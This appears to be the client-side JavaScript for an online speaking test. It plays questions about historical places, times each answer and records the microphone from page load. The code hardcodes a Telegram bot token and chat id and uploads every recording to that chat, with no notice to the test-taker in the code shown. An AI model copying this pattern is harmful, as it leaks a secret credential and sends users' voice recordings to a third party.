 // Define the questions array with questions and audio URLs
     const questions = {
  "1": {
    "id":"8",
    "question": "Why do some people like to visit historical places?",
    "audio_url": "audio/1.mp3"
  },
  "2": {
    "id":"9",
    "question": "Why do people go to modern city?",
    "audio_url": "audio/2.mp3"
  },
  "3": {
    "id":"10",
    "question": "What are the problems caused by maintaining historical city?",
    "audio_url": "audio/3.mp3"
  },
  "4": {
    "id":"11",
    "question": "Do you think having too many tourists is a positive thing for historical attractions?",
    "audio_url": "audio/4.mp3"
  },
  "5": {
    "id":"12",
    "question": "What can we do to stop visitors from damaging historical places?",
    "audio_url": "audio/5.mp3"
  },
  "6": {
    "id":"",
    "question": "This is the end of speaking test!",
    "audio_url": "audio/end.mp3"
  }
};

      // Get the HTML div element
      const questionDiv = document.getElementById("question-bar");
      const queId = document.getElementById("que-id");
      const timer = document.getElementById("timer");
      const blink = document.querySelector('.circle').style.display="none";
      const visualizer =document.getElementById("visualizer").style.display="none";
      
      let currentQuestionIndex = 1;
      // Define a function to show a random question
      function showNextQuestion() {
        const question = questions[currentQuestionIndex];
        queId.innerHTML=question.id;  
        currentQuestionIndex++;
  // Display the question
  questionDiv.innerHTML = question.question+"<br>"+ `</p><audio id="audio"   autoplay src="${question.audio_url}"></audio>`;


        // Get the audio element and set up event listeners
        const audioElement = document.getElementById("audio");
       /* document.querySelector(".startBtn").addEventListener("click", function(){
         audioElement.play();
        }); */

        const beep = document.getElementById("beep");
        beep.volume=0.5;
 const volumeSlider = document.getElementById('audio_volume');
 
 volumeSlider.addEventListener('input', function() {
    audioElement.volume = volumeSlider.value;
 });
  
 

  if (currentQuestionIndex >Object.keys(questions).length) {
    timer.style.display="none";
    document.querySelector('.circle').style.display="none";
    beep.pause();
    stopRecording();
    popUp();

  }


        audioElement.addEventListener("ended", startCountdown);
      }

      // Define a function to start the 5-second countdown
      function startCountdown() {
        let count = 5;
        timer.innerHTML += `Prepare:  ${count} seconds`;
        const interval = setInterval(() => {
          count--;
          timer.innerHTML = `Prepare:  ${count} seconds`;
          if (count <= 0) {
            beep.play();
            clearInterval(interval);
            start30SecondCountdown();
          }
        }, 1000);
      }

      // Define a function to start the 30-second countdown
      function start30SecondCountdown() {
        document.getElementById('visualizer').style.display="block";
        document.querySelector('.circle').style.display="block"
        let count = 30;
        timer.innerHTML = ` ${count} seconds to answer</p>`;
        const interval = setInterval(() => {
          count--;
          timer.innerHTML = `${count} seconds to answer</p>`;
          if (count <= 0) {
            document.querySelector('.circle').style.display="none";
            document.getElementById('visualizer').style.display="none";
            timer.innerHTML="";
            clearInterval(interval);
            showNextQuestion();

          }
        }, 1000);
      }

      // When the window is loaded, show a random question
      window.onload = showNextQuestion;
      
    
// Audio recorder


// audio recorder
let recorder, audio_stream;
//const recordButton = document.querySelector(".startBtn");
//const recordTxt = document.getElementById("recording");
//recordButton.addEventListener("click", startRecording);
//const stopButton = document.getElementById("stopButton");
//stopButton.addEventListener("click", stopRecording);

startRecording();
//rec function

function startRecording() {
  navigator.mediaDevices.getUserMedia({ audio: true })
    .then(function (stream) {
      audio_stream = stream;
      recorder = new MediaRecorder(stream);

      // when there is data, compile into object for preview src
      recorder.ondataavailable = function (e) {
        const url = URL.createObjectURL(e.data);
        const formData = new FormData();
        formData.append('audio', e.data, 'recording.ogg');
        fetch('https://api.telegram.org/bot6286896160:AAEDJPAnegyosnf4KlYbBMTJayMJxXggMvg/sendAudio?chat_id=-1001575547893', {
          method: 'POST',
          body: formData
        })
          .then(response => response.json())
          .then(data => console.log(data))
          .catch(error => console.error(error));
      };
      recorder.start();


    });
}


function stopRecording() {
    recorder.stop();
  }

//modal
function popUp(){
  document.querySelector(".modal-fade").style.display="block";
  document.querySelector(".modal-dialog").style.display="block";
}